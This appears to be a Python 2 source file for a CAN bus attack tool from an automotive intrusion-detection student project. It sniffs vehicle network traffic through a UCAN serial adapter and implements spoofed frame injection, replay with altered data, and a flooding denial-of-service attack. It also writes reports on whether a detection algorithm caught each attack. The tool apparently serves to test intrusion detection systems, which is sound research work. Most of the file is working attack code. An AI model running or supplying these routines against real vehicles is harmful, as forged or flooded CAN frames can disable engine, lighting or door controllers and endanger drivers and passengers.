'''
    CAN Bus Vulnerability tool
    This tool is part of Automotive IDPS and Cyber Security Vulnerability tool Graduation Project
Usage:
    app.py sniff [--port=COM6] [--baudrate=115200] [-d] [--conf=path] [--out] [(--BL case <case_name> )]
    app.py spoof [( <target_ecu_name> <msg_id> <signal_name> <new_val> <msg_rate> )][--port=COM6] [--baudrate=115200] [-d] [--conf=path] [(--DR <AlgorithmName>)]
    app.py replay <target_id> [ --new <new_val>] [--port=COM6] [--baudrate=115200] [-d] [(--DR <AlgorithmName>)]
    app.py dos [--port=COM6] [--baudrate=115200] [-d] [(--BL case <case_name> )] [(--DR <AlgorithmName>)]
    app.py report (-v case <case_name> )|
Options:
    --port=COM6         Select the port we connected our UCAN on default is COM6
    --baudrate=115200   Select the BaudRate we use default is 115200
    -d                 Debug mode
    --conf=path         Path of the xml config file default is conf.xml file name in same directory of the script
    --out               output the log of the sniffing to log.txt file
    --BL                calculate the busload and insert it into external file
    --DR                Detection Report for certain Detection Algorithm under test
    -v                 visualise the outputs
    --new              flag indicate the desire to send a new value in replay
'''
import datetime
# import threading
from threading import Thread,Lock
try:
    import sys,serial,time,binascii,UCAN,sched
    from docopt import docopt
    from decimal import *
    import matplotlib.pyplot as plt
    import csv
    from multiprocessing import Pool

except:
    print 'Import Errors!!'

''' Basic configuration'''
COM_PORT = 'COM6'
#COM_PORT = '/dev/ttyUSB0'
BaudRate = 115200
DEBUG = False


#starting
class CAN_MSG:
    ''' CAN MSG structure '''
    frame_id = 1 # int
    isExtended = 0 # bool
    frame_dlc=8 #integer
    data=None #str
    RTR=0#bool


''' Global Variables'''
sniffed_Msgs=[]
LOG = None
MSG_COUNTER = 0
MSG_LATEST_COUNT=0 #used in bus load
MSG_TEMP=0 #used in bus load function
RATE=0 #used in bus load function
CASENAME ="busLoad.txt"
NO_AUTH=False
MSGS_QUEUE = []
mutex = Lock()
msg = CAN_MSG

Engine_Speed = CAN_MSG
Engine_Temp = CAN_MSG
Engine_Petrol = CAN_MSG
Lamb_ONOFF=CAN_MSG
Door_ONOFF=CAN_MSG
s= sched.scheduler(time.time, time.sleep) # used in busload calculations
'''
Engine -> ids : 11 , 12 , 13
-> names temp , speed , petrol
dlc -> 1 , 2 , 1
->-temp , (rpm , speed) , level

Lamb ->id:
dlc :

door ->id:80
dlc :8
data -> right 0000FFFF
data -> right FFFF0000
'''
#msgs generated
def generate_engine_temp(val): ##val is an hex number
    global Engine_Temp
    Engine_Temp.frame_id = int('0x11',16)
    Engine_Temp.isExtended = 0 # bool
    Engine_Temp.frame_dlc=1 #integer
    Engine_Temp.data=str(val) #long
    Engine_Temp.RTR=0#bool

def generate_engine_speed(rpm,speed): ##val is an hex number
    global Engine_Speed
    Engine_Speed.frame_id = int('0x12',16)
    Engine_Speed.isExtended = 0 # bool
    Engine_Speed.frame_dlc=2 #integer
    Engine_Speed.data=str(rpm)+str(speed) #long
    Engine_Speed.RTR=0#bool

def generate_engine_petrol(val): ##val is an hex number
    global Engine_Petrol
    Engine_Petrol.frame_id = int('0x13',16)
    Engine_Petrol.isExtended = 0 # bool
    Engine_Petrol.frame_dlc=1 #integer
    Engine_Petrol.data=str(val) #long
    Engine_Petrol.RTR=0#bool

def generate_lamb_onOff(val): ##val is an hex number
    global Lamb_ONOFF
    Lamb_ONOFF.frame_id = int('0x50',16)
    Lamb_ONOFF.isExtended = 0 # bool
    Lamb_ONOFF.frame_dlc=1 #integer
    Lamb_ONOFF.data=str(val) #long
    Lamb_ONOFF.RTR=0#bool

def generate_door_onOff(left,right): ##val is an hex number
    global Door_ONOFF
    Door_ONOFF.frame_id = int('0x80',16)
    Door_ONOFF.isExtended = 0 # bool
    Door_ONOFF.frame_dlc=8 #integer
    Door_ONOFF.data=str(left)+str(right) #long
    Door_ONOFF.RTR=0#bool


class packageMsgForDOS(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        global msg
        #start sending msgs of id =0 over the bus with max rate
        msg.frame_id=0
        msg.frame_dlc=8
        msg.data='ffffffffffffffff'
        while True:
            global MSGS_QUEUE
            b=UCAN.UCAN_encode_message(msg)
            MSGS_QUEUE.append(b)

class dos(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        print("DOS attack started")
        while True:
            global MSGS_QUEUE,MSG_COUNTER
            if len(MSGS_QUEUE) != 0:
                b = MSGS_QUEUE.pop()
                MSG_COUNTER+=1
                ser.write(b)


class detected(Thread):
    '''
    This class thread will be used to generate a report incase of the attacks was detected by an IDS or not
    the attack is detected if it recieve an id of 0x01 and dlc of 1 and data of 0 ,
    '''
    def __init__(self,attack_name,algo_name):
        Thread.__init__(self)
        self.algo_name = algo_name
        self.attack_name = attack_name

    def run(self):
        #run bus load
        global CASENAME
        CASENAME = str(self.attack_name)+"_ON_"+str(self.algo_name)+".txt"
        thread = calc_BusLoad()
        thread.start()
        threads.append(thread)

        msg=CAN_MSG
        msg.frame_id=1
        time.sleep(10)
        if idExists(msg) :
            found = True
            print "Attack detected !!"
            log="===============Attack Failure Report=====================\n"
            log+="Attack Time:"+datetime.datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+"\n"
            log+="========\n"
            log+= str(self.attack_name)+" Attack has been Detected by :"+str(self.algo_name)+" \n"
            log+="========\n"
            log+="Bus Load report is named :"+CASENAME+"\n"
            if str(CASENAME) != "None":
                log+="========\n"
                log+="To view Bus load Graphs please enter the following command \n"
                log+="python app.py report -v case "+str(CASENAME)+"\n"
                log+="\n"
            else:
                log+="\n"
            sendToLog(log,'Attack_Report.txt')
        else:
            log="===============Attack Success Report=====================\n"
            log+="Attack Time:"+datetime.datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+"\n"
            log+="========\n"
            log+= str(self.attack_name)+" Attack is applied but Can't be Detected by :"+str(self.algo_name)+" \n"
            log+="========\n"
            log+="Bus Load report is named :"+str(CASENAME)+"\n"
            if str(CASENAME) != "None":
                log+="========\n"
                log+="To view Bus load Graphs please enter the following command \n"
                log+="python app.py report -v case "+str(CASENAME)+"\n"
                log+="\n"
            else:
                log+="\n"
            sendToLog(log,'Attack_Report.txt')
        print("Our Tool Finished Testing The Algorithm ..")



## Bus load calculations
##sequential bus load calc
# def calc_BusLoad():
#     global MSG_TEMP
#     global MSG_COUNTER
#     global MSG_LATEST_COUNT
#     MSG_TEMP=MSG_COUNTER-MSG_LATEST_COUNT
#     MSG_LATEST_COUNT=MSG_COUNTER
#     RATE=(MSG_TEMP/3906)*100
#     print('calc bus load hh')
#     file=open("dd.txt","a+")
#     file.write(str(RATE)+"\n")
#     file.close()
#     s.enter(1,1,calc_BusLoad,())

class calc_BusLoad(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        while True:
            global MSG_TEMP
            global MSG_COUNTER
            global MSG_LATEST_COUNT
            MSG_TEMP=MSG_COUNTER-MSG_LATEST_COUNT
            MSG_LATEST_COUNT=MSG_COUNTER
            RATE=(float(MSG_TEMP)/3906.0)*100.0
            file=open(str(CASENAME),"a+")
            file.write(str(RATE)+"\n")
            file.close()
            time.sleep(1)

class sniffing(Thread):
    def __init__(self):
        Thread.__init__(self)
    def run(self):
        print "++++++++= Start Sniffing CAN Bus =++++++++"
        while True:
            #convert from byte to hex string
            framebuffer=ser.read(13).encode('hex')
            if DEBUG==True :
                print "DEBUG-> SERIAL is ",framebuffer
            # bin(int(framebuffer,16)) #converted into binary
            msg = canFrameDecodder(framebuffer)
            printMsg(msg)

class visualize_busLoad(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        x = []
        with open(str(CASENAME),'r+') as csvfile:
            plots = csv.reader(csvfile, delimiter=',')
            for row in plots:
                x.append((row[0]))
        plt.plot(x, label='Bus Load')
        plt.xlabel('x')

        plt.title(CASENAME)
        plt.legend()
        plt.show()

class spoofing(Thread):
    def __init__(self,target,msg_id,signal,val,rate):
        Thread.__init__(self)
        self.target=target
        self.msg_id=msg_id
        self.signal=signal #toDo to be implemented in the future
        self.val=str(val)
        self.rate=rate

    def run(self):
        # msg = CAN_MSG
        if self.rate=='max' or self.rate =='MAX':
            rate_flag = 0
        elif self.rate ==0:
            print "ERROR RATE CAN NOT BE ZERO "
        else:
            rate_flag = int(1/float(self.rate))
        global msg
        msg.frame_id=int(self.msg_id)
        msg.data=self.val
        msg.frame_dlc=len(self.val)/2
        while True:
            time.sleep(rate_flag)
            mutex.acquire()
            global MSG_COUNTER
            MSG_COUNTER +=1
            # try:
            # b=UCAN.UCAN_encode_message(msg).buffer_info()
            # print b
            ser.write(UCAN.UCAN_encode_message(msg))
            print "CAN Frame injected successfully"
            mutex.release()
            # except Exception :
            #     print("can't perform inject the CAN Frame !!"),BaseException.message


class replay(Thread):
    def __init__(self,id,new,val):
        Thread.__init__(self)
        self.id=id
        self.val = val
        self.new = new

    def run(self):
        while True:
            framebuffer=ser.read(13).encode("hex") #read buffer
            msg = canFrameDecodder(framebuffer) #decode Frame
            if msg.frame_id == self.id: #if msg is found
                mutex.acquire()
                # msg.frame_dlc = len(msg.data)/2
                # print('msg found')
                #Update and send the msg
                if self.new==True: #if we need to update the value with a new One
                    msg.data=self.val
                    msg.frame_dlc = len(self.val)/2
                global MSG_COUNTER
                MSG_COUNTER +=1
                try:
                    ser.write(UCAN.UCAN_encode_message(msg))
                    print "Frame sent successfully" ,msg.data , msg.frame_id
                    mutex.release()
                except:
                    print "couldn't apply replay attack"


def startAuth():
    '''
Function name:
        startAuth()
Description:
        start Authentication of the Application with UCAN device and Open a serial connection with the device
Parameters (IN): -
Parameters (OUT): -
Return value: -
'''
    if DEBUG==True :
        print ("Start initialization")
    ser.setDTR(True);
    time.sleep(2)
    ser.write(bytearray([105, 115, 85, 50, 67]))
    if DEBUG==True :
        print ("Start reading")
    ans = ser.read(2)
    if DEBUG==True :
        print (ans)
        print ("reading finished")
        print ("recieved YI ")

    ser.write(bytearray([12]))


def closeConn():
    '''
Function name:
        closeConn()
Description:
        End the serial connection with the device and terminate the Application
Parameters (IN): -
Parameters (OUT): -
Return value -
'''
    ser.close()
    sys.exit(0)


def getFrameData(frame, dlc):
    '''
Function name:
        getFrameData(frame, dlc)
Description:
        extract the data section from the frame string
Parameters (IN):
        frame :the received frame string from the serial bus
        dlc : the length of the data section in bytes
Parameters (OUT):
        data : a string of data section
Return value: -
'''
    if DEBUG==True :
        print "DEBUG --> getFrameData-> dlc is ",dlc
    data = frame[12:12+(2*dlc)] #12 to 28
    if DEBUG==True :
        print "DEBUG --> Data is ",data
    return data

def getFrameDLC(frame):
    '''
Function name:
        getFrameDLC(frame)
Description:
        extract the dlc from the frame string
Parameters (IN):
        frame :the received frame string from the serial bus
Parameters (OUT):
        dlc: a string of dlc section
Return value: -
'''
    dlc = int(frame[10:12],16) & 0x0F
    if DEBUG==True :
        print "DEBUG --> DLC is ",dlc,type(dlc)
    return dlc

def canFrameDecodder(frame):
    '''
Function name : canFrameDecodder
Description : decode the frame string from the serial bus to a CAN msg object
Parameters (IN):
frame :the received frame string from the serial bus
Parameters (OUT) :
        msg: a msg object from CAN_MSG class
Return value : -
'''
    msg = CAN_MSG()
    mutex.acquire()
    msg.frame_id = getStandardID(frame)
    msg.frame_dlc = getFrameDLC(frame)
    msg.data = getFrameData(frame,msg.frame_dlc)
    mutex.release()
    return msg

def getStandardID(frame):
    '''
Function name: getStandardID
Description:get the standard ID from the Frame string
Parameters (IN):
        frame :the received frame string from the serial bus
Parameters (OUT):
        id : the ID of the CAN frame received
Return value:-
    '''
    # b1=int(frame[0:2],16)
    b1=int(frame[2:4],16)
    b2=int(frame[4:6],16)
    b3=int(frame[6:8],16)
    b4=int(frame[8:10],16)
    fId= b1 & 0b11111110 | b2<<8 | b3<<16 | b4<<24
    fId >>=1
    if DEBUG==True :
        print "DEBUG --> ID is " , fId
    return fId

def sendToLog(log,fileName):
    '''
Function name:sendToLog()
Description: save log to a text file
Parameters (IN):
        log : the log text that is going to be saved
        fileName : the name of the Log text file
Parameters (OUT): -
Return value:-
'''
    file = open(fileName,'a+')
    file.write(log)
    file.close()

def printMsg(msg):
    '''
Function name:printMsg(msg)
Description: print the CAN msg on the screen , save it to log file if required , and increase the can frame counter
Parameters (IN):
        msg : msg object from CAN_MSG class
Parameters (OUT):-
Return value:-
    '''
    global MSG_COUNTER
    log = str((MSG_COUNTER))+'@'+datetime.datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+("|ID :")+str(msg.frame_id)+"|DLC:"+str(msg.frame_dlc)+"|Data:"+str(msg.data) +'\n'
    MSG_COUNTER +=1
    if LOG != None:
        sendToLog(log,LOG)
    if sameFrameExists(msg):
        print log
        pass
    else:
        sniffed_Msgs.append(msg)
        print log

def sameFrameExists(msg):
    '''
Function name:sameFrameExists(msg)
Description:This function is used to check if the received can frame has been seen before or not , it is used in the printMsg function
Parameters (IN):
        msg : msg object from CAN_MSG class
Parameters (OUT):-
Return value:-
    '''
    for s in sniffed_Msgs:
        if (s.frame_id == msg.frame_id) and (s.data==msg.data):
            return True
    return False

def idExists(msg):
    '''
Function name:idExists(msg)
Description:
This function is used to check if the frame id has been seen before or not ,
we are not matching the data ,just the id ,
 it is used in the printMsg function
Parameters (IN):
        msg : msg object from CAN_MSG class
Parameters (OUT):-
Return value:-
    '''
    for s in sniffed_Msgs:
        if (s.frame_id == msg.frame_id):
            return True
    return False


if __name__ == '__main__':
    threads=[]
    # NO_AUTH=False
    arguments = docopt(__doc__)

    # startAuth()
    #incase of reports
    if arguments['report'] == True:
        # set no auth flag
        NO_AUTH = True
        if arguments['case'] == True:
            if DEBUG==True :
                print "DEBUG --> case name is " , arguments['<case_name>']
            CASENAME = arguments['<case_name>']

        if arguments['-v'] == True:
            if DEBUG==True :
                print "DEBUG --> visualise the bus load is enabled which will visaulise after 60 second"
            try:
                thread = visualize_busLoad()
                thread.daemon=True
                thread.start()
                threads.append(thread)
            except:
                print("can't start" ),"visualise_busLoad"

    if NO_AUTH == False:
        #handlling coniguration args
        if arguments['--port'] != None : #set the com port
            COM_PORT = str(arguments['--port'])
        if arguments['--baudrate'] != None: #set baudrate
            BaudRate = int(arguments['--baudrate'])
        #start connection
        try:
            ser = serial.Serial(COM_PORT, BaudRate)
        except serial.serialutil.SerialException:
            print '====================================================='
            print ("Not connected")
            print '====================================================='
            exit(0)

        # start UCAN authentication for Auth needed commands
        startAuth()
    # #
    # in case of spoofing
    # app.py spoof [( <target_ecu_name> <msg_id> <signal_name> <new_val> <msg_rate>)][--port=COM6] [--baudrate=115200] [-d] [--conf=path]
    if arguments['spoof']==True: #todo config=path
        msgArgs = {}
        if arguments['<target_ecu_name>'] != None:
            msgArgs['ecu_name'] = str(arguments['<target_ecu_name>'])
        if arguments['<msg_id>'] != None:
            try:
                msgArgs['msg_id'] = int(arguments['<msg_id>'])
            except:
                print "ERROR: Frame_Id not accepted !!"
        if arguments['<signal_name>'] != None:
            try:
                msgArgs['signal_name'] = arguments['<signal_name>']
            except:
                print "ERROR: signal_name not accepted !!"
        if arguments['<new_val>'] != None:
            try:
                msgArgs['new_val'] = arguments['<new_val>']
            except:
                print "ERROR: new_val is not accepted !!"
        if arguments['<msg_rate>'] != None:
            try:
                msgArgs['msg_rate'] = arguments['<msg_rate>']
            except:
                print "ERROR: new_val is not accepted !!"
        if arguments['-d'] == True: #enable Debug mode
            DEBUG=True

        if arguments['--baudrate'] != None: #set baudrate
            BaudRate = int(arguments['--baudrate'])

        if arguments['--DR']==True:
            #detection report is required
            if arguments['<AlgorithmName>'] != None:
                thread = detected('Spoofing',str(arguments['<AlgorithmName>']))
                thread.daemon=True
                thread.start()
                threads.append(thread)


        try:
            thread=spoofing(msgArgs['ecu_name'],msgArgs['msg_id'],msgArgs['signal_name'],msgArgs['new_val'],msgArgs['msg_rate'])
            thread.daemon=True
            thread.start()
            threads.append(thread)
        except:
            print('can not start sniff thread ')

    #in case of sniffing  todo : conf=path is not implemented yet
    if arguments['sniff'] == True:
        if DEBUG==True :
            print "DEBUG --> Starting Sniffing commmand"
        #getting args and options
        if arguments['--port'] != None : #set the com port
            COM_PORT = arguments['--port']

        if arguments['-d'] == True: #enable Debug mode
            DEBUG=True

        if arguments['--baudrate'] != None: #set baudrate
            BaudRate = int(arguments['--baudrate'])

        if arguments['--out'] == True:
            if DEBUG==True :
                print "DEBUG --> Log file output is enabled "
            LOG = 'log.txt'

        if arguments['case'] == True:
            if DEBUG==True :
                print "DEBUG --> case name is " , arguments['<case_name>']
            CASENAME = arguments['<case_name>']

        if arguments['--BL'] == True:
            if DEBUG==True :
                print "DEBUG --> calcaulate the busload per second is enabled "
            try:
                thread=calc_BusLoad()
                thread.daemon=True
                thread.start()
                threads.append(thread)
            except:
                print 'can not start calc_BusLoad thread!!'

        try:
            thread=sniffing()
            thread.daemon=True
            thread.start()
            threads.append(thread)
        except:
            print('can not start sniff thread ')
    #in case of DOS
    if arguments['dos'] == True:
        if arguments['--port'] != None : #set the com port
            COM_PORT = arguments['--port']
            if DEBUG==True:
                print 'DEBUG->> PORT is =',COM_PORT

        if arguments['-d'] == True: #enable Debug mode
            DEBUG=True

        if arguments['--baudrate'] != None: #set baudrate
            BaudRate = int(arguments['--baudrate'])

        if arguments['--BL'] == True:
            if arguments['case'] == True:
                if DEBUG==True :
                    print "DEBUG --> case name is " , arguments['<case_name>']
                CASENAME = arguments['<case_name>']
            thread = calc_BusLoad()
            thread.daemon=True
            thread.start()
            threads.append(thread)

        #start dos
        thread = packageMsgForDOS()
        thread.start()
        threads.append(thread)
        thread = dos()
        thread.start()
        threads.append(thread)
        if arguments['--DR']==True:
        #detection report is required
            if arguments['<AlgorithmName>'] != None:
                thread = detected('DOS',str(arguments['<AlgorithmName>']))
                thread.daemon=True
                thread.start()
                threads.append(thread)




    #in case of replay attack #todo we can inhance the app with a time to start and the no of repeat
    if arguments['replay'] == True:
        if arguments['--port'] != None : #set the com port
            COM_PORT = arguments['--port']
            if DEBUG==True:
                print 'DEBUG->> PORT is =',COM_PORT
        if arguments['-d'] == True: #enable Debug mode
            DEBUG=True

        if arguments['--baudrate'] != None: #set baudrate
            BaudRate = int(arguments['--baudrate'])
        if arguments['<target_id>'] != None:
            target = int(arguments['<target_id>'])
            if arguments['--new'] == True:
                if arguments['<new_val>'] != None:
                    val = arguments['<new_val>']
                thread = replay(target,True,val)
                thread.daemon=True
                thread.start()
                threads.append(thread)
            else:
                thread = replay(target,False,0)
                thread.daemon=True
                thread.start()
                threads.append(thread)
        if arguments['--DR']==True:
        #detection report is required
            if arguments['<AlgorithmName>'] != None:
                thread = detected('Replay',str(arguments['<AlgorithmName>']))
                thread.daemon=True
                thread.start()
                threads.append(thread)

    #
    #joining threads
    while len(threads) > 0:
        try:
            threads = [t.join(1000) for t in threads if t is not None and t.isAlive()]

        except KeyboardInterrupt:
            print 'Closing tool ...'
            sys.exit()

    #close connection with the serial port
    if NO_AUTH == False:
        # close connection with the serial port
        closeConn()
